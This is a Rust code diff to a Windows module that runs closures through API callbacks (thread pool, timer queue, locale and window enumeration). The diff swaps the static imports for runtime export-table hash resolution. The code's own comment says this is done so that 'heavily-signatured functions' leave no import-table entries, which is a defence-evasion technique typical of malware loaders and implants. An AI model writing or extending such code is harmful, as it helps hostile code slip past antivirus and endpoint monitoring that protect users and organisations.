@@ -3,19 +3,55 @@ use winapi::shared::minwindef::{BOOL, FALSE, LPARAM, TRUE};
 #[cfg(windows)]
 use winapi::shared::ntdef::HANDLE;
 #[cfg(windows)]
-use winapi::um::synchapi::WaitForSingleObject;
-#[cfg(windows)]
-use winapi::um::threadpoolapiset::{
-    CloseThreadpoolWork, CreateThreadpoolWork, SubmitThreadpoolWork,
-};
-#[cfg(windows)]
-use winapi::um::threadpoollegacyapiset::{CreateTimerQueueTimer, DeleteTimerQueueTimer};
-#[cfg(windows)]
-use winapi::um::winnls::EnumSystemLocalesEx;
-#[cfg(windows)]
 use winapi::um::winnt::{PTP_CALLBACK_INSTANCE, PTP_WORK, PVOID, WT_EXECUTEINTIMERTHREAD};
+
+// ── Dynamic resolution helpers (no IAT entries) ──────────────────────────
+//
+// All callback-execution APIs are resolved at runtime via PE export-table
+// hashing so that no import-table entries are created for these heavily-
+// signatured functions.
+
 #[cfg(windows)]
-use winapi::um::winuser::{EnumChildWindows, FindWindowA};
+use std::sync::OnceLock;
+
+#[cfg(windows)]
+fn resolve_fn<T>(lock: &OnceLock<Option<T>>, dll_bytes: &[u8], fn_bytes: &[u8]) -> Option<T>
+where
+    T: Copy,
+{
+    lock.get_or_init(|| unsafe {
+        let dll_hash = pe_resolve::hash_str(dll_bytes);
+        let dll_base = pe_resolve::get_module_handle_by_hash(dll_hash)?;
+        let fn_hash = pe_resolve::hash_str(fn_bytes);
+        let addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+        Some(std::mem::transmute::<usize, T>(addr))
+    })
+    .and_then(|&opt| opt)
+}
+
+#[cfg(windows)]
+static CREATE_THREADPOOL_WORK: OnceLock<Option<unsafe extern "system" fn(Option<extern "system" fn(PTP_CALLBACK_INSTANCE, PVOID, PTP_WORK)>, PVOID, *mut std::ffi::c_void) -> PTP_WORK>> = OnceLock::new();
+
+#[cfg(windows)]
+static SUBMIT_THREADPOOL_WORK: OnceLock<Option<unsafe extern "system" fn(PTP_WORK)>> = OnceLock::new();
+
+#[cfg(windows)]
+static CLOSE_THREADPOOL_WORK: OnceLock<Option<unsafe extern "system" fn(PTP_WORK)>> = OnceLock::new();
+
+#[cfg(windows)]
+static CREATE_TIMER_QUEUE_TIMER: OnceLock<Option<unsafe extern "system" fn(*mut HANDLE, HANDLE, Option<extern "system" fn(PVOID, winapi::um::winnt::BOOLEAN)>, PVOID, u32, u32, u32) -> BOOL>> = OnceLock::new();
+
+#[cfg(windows)]
+static DELETE_TIMER_QUEUE_TIMER: OnceLock<Option<unsafe extern "system" fn(HANDLE, HANDLE, HANDLE) -> BOOL>> = OnceLock::new();
+
+#[cfg(windows)]
+static ENUM_SYSTEM_LOCALES_EX: OnceLock<Option<unsafe extern "system" fn(Option<extern "system" fn(*mut u16, u32, LPARAM) -> BOOL>, u32, LPARAM, *mut std::ffi::c_void) -> BOOL>> = OnceLock::new();
+
+#[cfg(windows)]
+static ENUM_CHILD_WINDOWS: OnceLock<Option<unsafe extern "system" fn(HANDLE, Option<extern "system" fn(winapi::shared::windef::HWND, LPARAM) -> BOOL>, LPARAM) -> BOOL>> = OnceLock::new();
+
+#[cfg(windows)]
+static FIND_WINDOW_A: OnceLock<Option<unsafe extern "system" fn(*const i8, *const i8) -> winapi::shared::windef::HWND>> = OnceLock::new();
 
 pub enum CallbackType {
     ThreadpoolWork,
@@ -35,7 +71,11 @@ extern "system" fn threadpool_callback(
         closure();
     }
     if !work.is_null() {
-        unsafe { CloseThreadpoolWork(work) };
+        if let Some(close_fn) = resolve_fn(&CLOSE_THREADPOOL_WORK, b"kernel32.dll\0", b"CloseThreadpoolWork\0") {
+            unsafe { close_fn(work) };
+        } else {
+            log::warn!("callback_exec: CloseThreadpoolWork not resolved, leaking work object");
+        }
     }
 }
 
@@ -46,13 +86,17 @@ where
 {
     let closure: Box<Box<dyn FnOnce() + Send>> = Box::new(Box::new(f));
     let context = Box::into_raw(closure) as PVOID;
+    let create_fn = resolve_fn(&CREATE_THREADPOOL_WORK, b"kernel32.dll\0", b"CreateThreadpoolWork\0")
+        .ok_or_else(|| anyhow::anyhow!("failed to resolve CreateThreadpoolWork dynamically"))?;
+    let submit_fn = resolve_fn(&SUBMIT_THREADPOOL_WORK, b"kernel32.dll\0", b"SubmitThreadpoolWork\0")
+        .ok_or_else(|| anyhow::anyhow!("failed to resolve SubmitThreadpoolWork dynamically"))?;
     unsafe {
-        let work = CreateThreadpoolWork(Some(threadpool_callback), context, std::ptr::null_mut());
+        let work = create_fn(Some(threadpool_callback), context, std::ptr::null_mut());
         if work.is_null() {
             let _ = Box::from_raw(context as *mut Box<dyn FnOnce() + Send>);
             anyhow::bail!("CreateThreadpoolWork failed");
         }
-        SubmitThreadpoolWork(work);
+        submit_fn(work);
     }
     Ok(())
 }
@@ -76,10 +120,14 @@ where
 {
     let closure: Box<Box<dyn FnOnce() + Send>> = Box::new(Box::new(f));
     let lparam = Box::into_raw(closure) as LPARAM;
+    let find_window = resolve_fn(&FIND_WINDOW_A, b"user32.dll\0", b"FindWindowA\0")
+        .ok_or_else(|| anyhow::anyhow!("failed to resolve FindWindowA dynamically"))?;
+    let enum_child = resolve_fn(&ENUM_CHILD_WINDOWS, b"user32.dll\0", b"EnumChildWindows\0")
+        .ok_or_else(|| anyhow::anyhow!("failed to resolve EnumChildWindows dynamically"))?;
     unsafe {
-        let parent = FindWindowA(b"Shell_TrayWnd\0".as_ptr() as _, std::ptr::null());
+        let parent = find_window(b"Shell_TrayWnd\0".as_ptr() as _, std::ptr::null());
         if !parent.is_null() {
-            EnumChildWindows(parent, Some(child_windows_callback), lparam);
+            enum_child(parent, Some(child_windows_callback), lparam);
         } else {
             let _ = Box::from_raw(lparam as *mut Box<dyn FnOnce() + Send>);
             anyhow::bail!("FindWindowA failed");
@@ -128,8 +176,12 @@ extern "system" fn timer_queue_callback(
     }
     // Delete the one-shot timer to release its kernel object.
     if h != 0 {
-        unsafe {
-            DeleteTimerQueueTimer(std::ptr::null_mut(), h as HANDLE, std::ptr::null_mut());
+        if let Some(delete_fn) = resolve_fn(&DELETE_TIMER_QUEUE_TIMER, b"kernel32.dll\0", b"DeleteTimerQueueTimer\0") {
+            unsafe {
+                delete_fn(std::ptr::null_mut(), h as HANDLE, std::ptr::null_mut());
+            }
+        } else {
+            log::warn!("callback_exec: DeleteTimerQueueTimer not resolved, leaking timer");
         }
     }
     // ctx is dropped here, freeing the heap allocation.
@@ -144,10 +196,12 @@ where
         timer_handle: std::sync::atomic::AtomicUsize::new(0),
         closure: std::sync::Mutex::new(Some(Box::new(f) as Box<dyn FnOnce() + Send>)),
     });
+    let create_timer_fn = resolve_fn(&CREATE_TIMER_QUEUE_TIMER, b"kernel32.dll\0", b"CreateTimerQueueTimer\0")
+        .ok_or_else(|| anyhow::anyhow!("failed to resolve CreateTimerQueueTimer dynamically"))?;
     let ctx_ptr = Box::into_raw(ctx);
     unsafe {
         let mut handle: HANDLE = std::ptr::null_mut();
-        if CreateTimerQueueTimer(
+        if create_timer_fn(
             &mut handle,
             std::ptr::null_mut(),
             Some(timer_queue_callback),
@@ -195,12 +249,13 @@ pub fn execute_enum_system_locales<F>(f: F) -> Result<(), anyhow::Error>
 where
     F: FnOnce() + Send + 'static,
 {
-    use winapi::um::winnls::EnumSystemLocalesEx;
+    let enum_fn = resolve_fn(&ENUM_SYSTEM_LOCALES_EX, b"kernel32.dll\0", b"EnumSystemLocalesEx\0")
+        .ok_or_else(|| anyhow::anyhow!("failed to resolve EnumSystemLocalesEx dynamically"))?;
     let closure: Box<Box<dyn FnOnce() + Send>> = Box::new(Box::new(f));
     let lparam = Box::into_raw(closure) as LPARAM;
     unsafe {
         // LOCALE_ALL = 0; EnumSystemLocalesEx passes lparam to the callback.
-        if EnumSystemLocalesEx(
+        if enum_fn(
             Some(enum_locales_ex_callback),
             0,
             lparam,
